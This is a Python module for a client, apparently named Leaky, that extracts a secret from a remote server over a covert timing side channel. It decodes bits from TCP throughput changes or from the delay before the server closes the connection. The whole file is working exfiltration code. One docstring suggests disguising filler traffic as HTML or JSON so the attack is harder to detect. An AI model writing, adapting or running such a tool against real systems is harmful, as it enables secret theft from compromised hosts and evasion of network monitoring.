import socket
import multiprocessing as mp
import time
import os
import queue

from functools import reduce
from operator import or_

from .message import *
from .logger import logger


class ExitSignal(Exception):
    """Process received close signal"""
    pass


def reconstruct_byte(bits):
    """Reconstruct an integer from a list of bits

    Parameters:
        bits (List[bool]): byte bits

    Returns:
        int: byte value
    """
    return reduce(or_, (1<<i for i, bit in enumerate(bits) if bit), 0)



def generate_nop_message():
    """Generate a nop message with random data.
    
        Modify this function if you wan't more innocuous looking nop messages
        to make the attack harder to detect, for example html or json data.
  
        LeakyNopMessage(some_507_bytes_of_json)

    Returns:
        LeakyNopMessage
    """
    return LeakyNopMessage(os.urandom(507))


class LeakyFlowProc(mp.Process):
    
    def __init__(self, result_q, close_event, host, port, low, high, settle_time, sample_time):
        """
        Parameters:
            result_q (mp.Queue): Queue where the extracted bits values are sent
                    
                    ("length", secret_length)
                    ("secret", b'a')
                    ("secret", b' ')
                    ("secret", b's')
                    ("secret", b'e')
                    .
                    .
                    .
                    ("done", None)

                    ("error", "some error message") - Exit because some error
                    ("exit", "message") - Exit after request

            close_event (mp.Event): Signal process to exit
            host (str): Remote host address
            port (int): Remote host port
            low (int): Speed to signal a low bit (in bytes/sec)
            high (int): Speed to signal a high bit (in bytes/sec)
            settle_time (float): Time between sending a bit request and the start of
                tx rate sampling
            sample_time (float): Tx rate sample time after settle_time
        """
        super().__init__()
        self.result_q = result_q
        self.close_event = close_event
        self.host = host
        self.port = port
        self.low  = low
        self.high = high
        self.settle_time = settle_time
        self.sample_time = sample_time

        # When sampling rates above this one are considered high, below are low
        self.limit_rate = self.low + (self.high-self.low)/2

        # Generate a nop message only once to save a little cpu.
        self.nop_msg = generate_nop_message().to_bytes()
       

    def sample_speed(self, sock):
        """ """
        # Wait settle time.
        start = time.time()
        while True:

            # Check exit signal here because this is where the process is
            # blocked most of the time
            if self.close_event.is_set():
                raise ExitSignal()

            sock.sendall(self.nop_msg)
            now = time.time()
            if now-start > self.settle_time:
                break

        # Start sampling
        start = time.time()
        now   = start + 0.01
        sent = 0
        while True:

            # Check exit signal here because this is where the process is
            # blocked most of the time
            if self.close_event.is_set():
                raise ExitSignal()

            sock.sendall(self.nop_msg)
            sent+=1
            now = time.time()
            if now-start > self.sample_time:
                break

        speed = (sent*len(self.nop_msg))/(now-start)
        
        return speed > self.limit_rate


    def get_secret_length(self, sock):
        """Obtain secret length (16 bits)

        Parameters:
            sock (socket.Socket): Open socket
        
        Returns:
            int: Secret's length
        """
        bits = []
        for bit in range(16):
            length_msg = LeakySecretLengthMessage(bit)
            sock.sendall(length_msg.to_bytes())
            bits.append(self.sample_speed(sock))
            logger.debug("Secret Length {}: {}".format(bit, bits[-1]))

        length = reconstruct_byte(bits)
        logger.debug("Secret Length {}".format(length))
        return length


    def get_secret_byte(self, sock, index):
        """Request and reconstruct all the bits

        Parameters:
            sock (socket.Socket): Open socket
            index (int): Index of the secret
        """
        bits = []

        for bit in range(8):
            secret_msg = LeakySecretMessage(index, bit)
            sock.sendall(secret_msg.to_bytes())
            bits.append(self.sample_speed(sock))
            logger.debug("Secret {}.{}: {}".format(index, bit, bits[-1]))

        return bytes([reconstruct_byte(bits)])


    def run(self):
       
        packets_sent = 0
        start = time.time()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)    
            sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
            
            try:
                sock.connect((self.host, self.port))
            except ConnectionRefusedError:
                self.result_q.put(("error", "Connection refused"))
                return

            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)    
            sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
            
            # Set attack mode
            msg = LeakyModeMessage(LeakyAttackMode.FLOW_MODULATION, self.low, self.high) 
            sock.sendall(msg.to_bytes())

            # Get secret length
            try:
                secret_length = self.get_secret_length(sock) 
            except (ConnectionError, BrokenPipeError):
                self.result_q.put(("error", "Error: Connection closed"))
                return
            except ExitSignal:
                self.result_q.put(("exit", "exit request"))
                return

            self.result_q.put(("length", secret_length))

            # Get all secret bytes
            try:
                for index in range(secret_length):
                    secret_byte = self.get_secret_byte(sock, index)
                    self.result_q.put(("secret", secret_byte))
            except (ConnectionError, BrokenPipeError):
                self.result_q.put(("error", "Error: Connection closed"))
                return
            except ExitSignal:
                self.result_q.put(("exit", "exit request"))
                return

        sock.close()
        self.result_q.put(("done", None))

        


class LeakyCloseProc(mp.Process): 

    def __init__(self, result_q, close_event, host, port, low, high):
        """
        Parameters:            
        
            result_q (mp.Queue): Queue where the extracted bits values are sent
                    
                    ("length", secret_length)
                    ("secret", b'a')
                    ("secret", b' ')
                    ("secret", b's')
                    ("secret", b'e')
                    .
                    .
                    .
                    ("done", None)

                    ("error", "some error message") - Exit because some error
                    ("exit", "message") - Exit after request

            close_event (mp.Event): Signal process to exit
            host (str): Remote host address
            port (int): Remote host port
            low (int): Speed to signal a low bit (in bytes/sec)
            high (int): Speed to signal a high bit (in bytes/sec)
        """
        super().__init__()

        self.result_q = result_q
        self.close_event = close_event
        self.host = host
        self.port = port
        self.low  = low
        self.high = high

        # Tx rate of data (nop messages) sent to the server to keep the 
        # connection alive
        self.limit_delay = (self.low + (self.high-self.low)/2)/1000

        # Generate a nop message only once to save a little cpu.
        self.nop_msg = generate_nop_message().to_bytes()
    
    def time_close_delay(self, msg, max_delay=100):
        """Send message through socket and measure the server connection close delay.

        Parameters:
            msg:

        Returns:
            bool:
                True - The close delay was for high bit
                False - The close delay was for a low bit
        Raises:
            TimeoutError: Connection wasn't closed by the server before max_delay
            ConnectionRefusedError: Server not listening
        """
        max_delay = 3*self.high

        # This could raise ConnectionRefusedError
        try:
            sock = socket.create_connection((self.host, self.port), timeout=max_delay)
        except socket.timeout:
            raise TimeoutError()
        
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)    
        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)

        # Set attack mode
        mode_msg = LeakyModeMessage(LeakyAttackMode.CLOSE_DELAY, self.low, self.high)
        sock.sendall(mode_msg.to_bytes())

        # Send request
        sock.sendall(msg.to_bytes())
        start = time.time()

        # Send nop messages to keep alive the connection, until the server closes it.
        while True:
            try:
                sock.sendall(self.nop_msg)
            except (ConnectionError, BrokenPipeError):
                end = time.time()
                break

            # Best place to check for exit signals
            if self.close_event.is_set():
                raise ExitSignal()

            # Check for max_delay 
            now = time.time()
            if now-start > max_delay:
                sock.close()
                raise TimeoutError("")
       
        return (end-start) > self.limit_delay
    
    
    def get_secret_length(self):
        """Obtain secret length (16 bits)"""
        bits = []
        for bit in range(16):
            length_msg = LeakySecretLengthMessage(bit)
            bits.append(self.time_close_delay(length_msg))
            logger.debug("Secret Legth {}: {}".format(bit, bits[-1]))
            
        length = reconstruct_byte(bits)
        logger.debug("Secret Length {}".format(length))
        return length


    def get_secret_byte(self, index):
        """Request and reconstruct all the bits

        Parameters:
            index (int): Index of the secret
        """
        bits = []

        for bit in range(8):
            secret_msg = LeakySecretMessage(index, bit)
            bits.append(self.time_close_delay(secret_msg))
            logger.debug("Secret {}.{}: {}".format(index, bit, bits[-1]))
        
        return bytes([reconstruct_byte(bits)])


    def run(self):
        """Main request loop"""       

        # Get secret length
        try:
            secret_length = self.get_secret_length() 
        except TimeoutError:
            self.result_q.put(("error", "secret_length request timedout"))
            return

        except ConnectionRefusedError:
            self.result_q.put(("error", "Connection refused by host"))
            return

        except ExitSignal:
            self.result_q.put(("exit", "exit request"))
            return

        self.result_q.put(("length", secret_length))

        # Get all secret bytes
        try:
            for index in range(secret_length):
                secret_byte = self.get_secret_byte(index)
                self.result_q.put(("secret", secret_byte))
        
        except TimeoutError:
            print("timeout")
            self.result_q.put(("error", "secret bit request timedout"))
            return
        
        except ConnectionRefusedError:
            print("refused")
            self.result_q.put(("error", "Connection refused by host"))
            return
        
        except ExitSignal:
            print("exit signal")
            self.result_q.put(("exit", "exit request"))
            return

        print
        self.result_q.put(("done", None))


class LeakyClient:

    def __init__(self, host, port, mode, low=10000, high=100000, settle_time=10.0, sample_time=4.0):
        """ 
        
        Parameters:
            host (str): Remote server address
            port (int): Remote server port
            low (int):
                CLOSE_DELAY: Delay in ms to signal low bit
                FLOW_MODULATION: bytes/s to signal low bit
            high (int):
                CLOSE_DELAY: Delay in ms to signal high bit
                FLOW_MODULATION: bytes/s to signal high bit
        """
        self.host = host
        self.port = port
        self.mode = mode
        self.low  = low
        self.high = high
        self.settle_time = settle_time
        self.sample_time = sample_time

        # Queue used to receive data from the attack process, and event
        # to signal those same proesses to exit.
        self.result_q = mp.Queue(2000)
        self.close_event = mp.Event()

        # Initialize process
        if self.mode == LeakyAttackMode.FLOW_MODULATION:
            self.proc = LeakyFlowProc(
                self.result_q,
                self.close_event, 
                host, port, low, high, 
                settle_time, sample_time
            )

        elif self.mode == LeakyAttackMode.CLOSE_DELAY:
            self.proc = LeakyCloseProc(
                self.result_q,
                self.close_event, 
                host, port,
                low, high
            ) 
        
        else:
            raise ValueError("Unknown attack mode")

        # Secret total length
        self.secret_length = None

        # Secret bytes received until now
        self.secret = b''

        # Received all the secret bytes succesfully
        self.finished = False

        # Connection of Process failed
        self.error = False
        self.error_msg = ""

    def _get_updates(self, block=True, timeout=None):
        """Get update from the process result queue"""
        while True:
            try: 
                typ, data = self.result_q.get(block, timeout)
            except queue.Empty:
                break

            if typ == "length":
                self.secret_length = data

            elif typ == "secret":
                self.secret += data

            elif typ == "done":
                self.finished = True
                break

            elif typ == "error":
                self.error = True
                self.error_msg = data
                break

            else:
                raise ValueError("Unknown update {}".format(typ))

    def get_secret(self, block=True, timeout=None):
        """Get the secret portion received until now
        
        Parameters:
            block (bool): If False returns inmediately with the secret received up
                that moment, if true blocks for timeout.

            timeout (int|None): If None it blocks until the secret is fully received 
                or the connection fails, if it's an integer and timeouts returns the 
                secret received up to that moment.

        Returns:
            Tuple(bytes, bool): (Secret, completed):
                secret: Partial or full secret
                completed: True if the secret is complete, False if it is partial
        Raises:
            ConnectionError: Connection failed before recovering the secret
        """
        self._get_updates(block, timeout)

        if self.error:
            raise ConnectionError(self.error_msg)

        return self.secret, self.finished

    def __enter__(self):
        """ """
        self.start()
        return self

    def __exit__(self, type, value, traceback):
        """ """
        self.stop()

    def start(self):
        """Start client process"""
        self.proc.start()

    def stop(self):
        """Close leaky client process and exit"""
        self.close_event.set()
        self.proc.join()

    def secret(self):
        pass

